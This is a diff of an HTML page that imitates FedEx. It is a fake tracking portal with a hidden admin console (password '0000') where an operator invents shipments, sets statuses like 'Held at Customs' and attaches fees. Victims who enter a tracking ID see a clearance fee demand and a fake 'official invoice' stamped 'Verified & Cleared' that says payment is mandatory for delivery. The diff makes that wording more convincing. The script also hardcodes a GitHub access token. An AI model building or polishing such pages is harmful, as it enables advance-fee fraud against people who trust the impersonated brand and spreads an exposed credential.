@@ -3,47 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FedEx | Official Global Tracking</title>
+    <title>Fedex | Logistics Portal</title>
     
-    <meta name="description" content="Official FedEx tracking portal. Enter your ID for real-time shipment updates.">
-    <meta property="og:title" content="FedEx | Package Tracking">
+    <meta name="description" content="Official Fedex tracking portal. Enter your ID for real-time shipment updates.">
+    <meta property="og:title" content="Fedex | Package Tracking">
     <meta property="og:image" content="https://newsroom.fedex.com/wp-content/uploads/2021/05/FedEx-Truck.jpg">
     <meta property="og:type" content="website">
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         :root { --p: #4D148C; --o: #FF6200; --bg: #f8f9fa; }
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); color: #333; }
-        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:999; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); color: #333; overflow-x: hidden; }
+        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:999; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .logo { font-size: 24px; font-weight: 900; cursor: pointer; }
         .wrapper { padding: 15px; max-width: 480px; margin: auto; }
         .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); margin-top: 20px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
         .btn-o { background: var(--o); color: white; }
         
         #result { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
-        .status-box { padding: 12px; border-radius: 6px; text-align: center; font-weight: bold; margin-bottom: 20px; border: 1px solid #ddd; text-transform: uppercase; font-size: 14px; }
+        .status-box { padding: 12px; border-radius: 6px; text-align: center; font-weight: bold; margin-bottom: 20px; border: 1px solid #ddd; text-transform: uppercase; font-size: 14px; background: #f0f0f0; }
         .row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
         .pkg-img { width: 100%; border-radius: 10px; margin-top: 20px; display: none; border: 1px solid #eee; }
         
-        #pay-box { display: none; margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 5px solid #ffc107; }
+        #pay-box { display: none; margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 5px solid #ffc107; font-size: 14px; }
 
-        /* NO-SCROLL INVOICE OVERLAY */
+        /* NO-SCROLL INVOICE OVERLAY - FITS ONE SCREEN */
         #invoice-overlay { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); z-index: 10000; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.9); z-index: 10000; align-items: center; justify-content: center;
         }
         #invoice-capture { 
-            background: white; width: 90%; max-width: 380px; padding: 15px; border-radius: 4px; box-sizing: border-box; 
+            background: white; width: 95%; max-width: 380px; padding: 18px; border-radius: 4px; position: relative;
+            box-sizing: border-box; font-family: 'Arial', sans-serif;
         }
-        .inv-header { display: flex; justify-content: space-between; border-bottom: 3px solid var(--p); padding-bottom: 8px; margin-bottom: 12px; }
-        .stamp { border: 2px solid #d00; color: #d00; padding: 4px 8px; font-weight: 900; text-transform: uppercase; transform: rotate(-10deg); display: inline-block; font-size: 12px; margin: 10px 0; }
-        .inv-table { width: 100%; border-collapse: collapse; font-size: 11px; margin: 10px 0; }
-        .inv-table th { text-align: left; border-bottom: 1px solid #333; }
-        .inv-table td { padding: 6px 0; border-bottom: 1px solid #eee; }
-        .total-row { text-align: right; font-weight: bold; font-size: 15px; margin-top: 8px; border-top: 2px solid #000; padding-top: 4px; }
-
+        .inv-header { display: flex; justify-content: space-between; border-bottom: 3px solid var(--p); padding-bottom: 10px; margin-bottom: 15px; }
+        .stamp { border: 3px solid #d00; color: #d00; padding: 4px 8px; font-weight: 900; text-transform: uppercase; transform: rotate(-10deg); display: inline-block; font-size: 13px; margin: 8px 0; }
+        .inv-table { width: 100%; border-collapse: collapse; font-size: 12px; margin: 12px 0; }
+        .inv-table th { text-align: left; border-bottom: 2px solid #333; padding: 5px; }
+        .inv-table td { padding: 8px 5px; border-bottom: 1px solid #eee; }
+        .total-row { text-align: right; font-weight: bold; font-size: 16px; margin-top: 10px; border-top: 2px solid #000; padding-top: 5px; }
+        
         #admin-panel { display: none; background: #1a1a1a; color: white; padding: 20px; border-radius: 12px; margin-top: 20px; }
         #admin-panel input, #admin-panel select { background: #333; color: white; border: 1px solid #444; }
     </style>
@@ -52,31 +53,31 @@
 
 <div class="nav">
     <div class="logo" onclick="openAdmin()">Fed<span style="color:var(--o)">ex</span></div>
-    <div style="font-size:11px; opacity:0.8;">Secure Tracking</div>
+    <div style="font-size:11px; opacity:0.8;">Global Tracking</div>
 </div>
 
 <div class="wrapper">
     <div class="card" id="client-view">
         <h2 style="margin:0 0 10px 0; color:var(--p)">Track Package</h2>
         <input type="text" id="trackInput" placeholder="Tracking ID (e.g. FDX-5755)">
-        <button class="btn btn-o" id="mainTrackBtn" onclick="handleTracking()">TRACK</button>
+        <button class="btn btn-o" id="mainTrackBtn" onclick="handleTracking()">TRACK SHIPMENT</button>
 
         <div id="result">
             <div id="st-badge" class="status-box"></div>
-            <div class="row"><span>Recipient:</span> <b id="r-name"></b></div>
+            <div class="row"><span>Consignee:</span> <b id="r-name"></b></div>
             <div class="row"><span>Route:</span> <b><span id="r-origin"></span> ➔ <span id="r-dest"></span></b></div>
             <div class="row"><span>Date:</span> <b id="r-date"></b></div>
             <img id="r-img" class="pkg-img">
             
             <div id="pay-box">
                 <p id="pay-msg"></p>
-                <button class="btn" style="background:#333; color:white;" onclick="previewAndDownload()">DOWNLOAD INVOICE</button>
+                <button class="btn" style="background:#333; color:white;" onclick="previewAndDownload()">VIEW & DOWNLOAD INVOICE</button>
             </div>
         </div>
     </div>
 
     <div id="admin-panel">
-        <h3>Admin Panel</h3>
+        <h3>Admin Console</h3>
         <input type="text" id="a-code" placeholder="Tracking ID">
         <input type="text" id="a-name" placeholder="Client Name">
         <input type="text" id="a-origin" placeholder="Origin">
@@ -88,30 +89,30 @@
             <option value="Held at Customs">Held at Customs</option>
         </select>
         <input type="file" id="a-file" accept="image/*">
-        <button class="btn btn-o" onclick="saveToCloud()">SAVE SHIPMENT</button>
-        <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">EXIT</button>
+        <button class="btn btn-o" onclick="saveToCloud()">SAVE DATA</button>
+        <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">LOGOUT</button>
     </div>
 </div>
 
 <div id="invoice-overlay" onclick="this.style.display='none'">
     <div id="invoice-capture">
         <div class="inv-header">
-            <div><b style="color:var(--p); font-size:20px;">FedEx<span style="color:var(--o)">.</span></b></div>
-            <div style="text-align:right"><b style="font-size:11px;">OFFICIAL INVOICE</b></div>
+            <div><b style="color:var(--p); font-size:22px;">Fedex<span style="color:var(--o)">.</span></b></div>
+            <div style="text-align:right"><b style="font-size:12px;">OFFICIAL INVOICE</b><br><span id="inv-code" style="font-size:10px; font-weight:bold;"></span></div>
         </div>
-        <div style="font-size:10px; margin-bottom:10px;">
-            <b>ID:</b> <span id="inv-code"></span><br>
+        <div style="font-size:11px; margin-bottom:15px;">
             <b>BILL TO:</b> <span id="inv-name"></span><br>
+            <b>DESTINATION:</b> <span id="inv-dest"></span><br>
             <b>DATE:</b> <span id="inv-date"></span>
         </div>
         <div style="text-align:center;"><div class="stamp">Verified & Cleared</div></div>
         <table class="inv-table">
             <thead><tr><th>Description</th><th>Total</th></tr></thead>
-            <tbody><tr><td>International Customs & Regulatory Fees</td><td>$<span id="inv-fee"></span></td></tr></tbody>
+            <tbody><tr><td>International Regulatory Clearance Fees</td><td>$<span id="inv-fee"></span></td></tr></tbody>
         </table>
-        <div class="total-row">TOTAL: $<span id="inv-fee-total"></span></div>
-        <div style="margin-top:15px; font-size:8px; color:#666; border-top:1px solid #eee; padding-top:8px;">
-            Notice: Settlement is required for release. This is an official electronic document.
+        <div class="total-row">TOTAL DUE: $<span id="inv-fee-total"></span></div>
+        <div style="margin-top:20px; font-size:9px; color:#555; line-height:1.3; border-top:1px solid #eee; padding-top:10px;">
+            <b>Important Notice:</b> Settlement is mandatory for final home-delivery release. This is an official electronic document.
         </div>
     </div>
 </div>
@@ -121,17 +122,17 @@
     const R = "fedex-trackshippingcode";
     const KEY = "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";
 
-    function openAdmin() { if(prompt("Auth")==="0000"){ document.getElementById('client-view').style.display='none'; document.getElementById('admin-panel').style.display='block'; } }
+    function openAdmin() { if(prompt("Pass")==="0000"){ document.getElementById('client-view').style.display='none'; document.getElementById('admin-panel').style.display='block'; } }
 
     async function handleTracking() {
         const btn = document.getElementById('mainTrackBtn'), input = document.getElementById('trackInput').value;
-        if(!input) return; btn.innerText = "SEARCHING...";
-        setTimeout(async () => { await startTracking(input); btn.innerText = "TRACK"; }, 2000);
+        if(!input) return; btn.innerText = "VERIFYING..."; btn.disabled = true;
+        setTimeout(async () => { await startTracking(input); btn.innerText = "TRACK SHIPMENT"; btn.disabled = false; }, 2000);
     }
 
     async function startTracking(input) {
         const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, { headers: { "Authorization": `token ${KEY}` } });
-        if(!res.ok) return alert("System database not initialized. Add a shipment first.");
+        if(!res.ok) return alert("System database not initialized. Add a shipment in Admin first.");
         const file = await res.json(); const data = JSON.parse(atob(file.content)); const s = data[input];
         if(s) {
             document.getElementById('result').style.display = 'block';
@@ -143,14 +144,15 @@
             if(s.img){ document.getElementById('r-img').src = s.img; document.getElementById('r-img').style.display='block'; }
             if(s.status.includes("Arrived") || s.status.includes("Clearance")) {
                 document.getElementById('pay-box').style.display='block';
-                document.getElementById('pay-msg').innerHTML = `<b>Fee Outstanding:</b> $${s.fee}`;
+                document.getElementById('pay-msg').innerHTML = `<b>Administrative Action Required:</b> Clearance fee of <b>$${s.fee}</b> is outstanding.`;
                 document.getElementById('inv-code').innerText = input;
                 document.getElementById('inv-name').innerText = s.name;
+                document.getElementById('inv-dest').innerText = s.dest;
                 document.getElementById('inv-fee').innerText = s.fee;
                 document.getElementById('inv-fee-total').innerText = s.fee;
                 document.getElementById('inv-date').innerText = s.date;
             }
-        } else alert("Tracking ID not found.");
+        } else alert("Invalid Tracking ID");
     }
 
     function previewAndDownload() {
@@ -178,7 +180,7 @@
         if(check.ok) { const existing = await check.json(); db = JSON.parse(atob(existing.content)); sha = existing.sha; }
         db[id] = payload;
         await fetch(url, { method: "PUT", headers: { "Authorization": `token ${KEY}` }, body: JSON.stringify({ message: "Update", content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))), sha: sha }) });
-        alert("Shipment Saved! You can now track it."); location.reload();
+        alert("Shipment Registered!"); location.reload();
     }
 </script>
 </body>
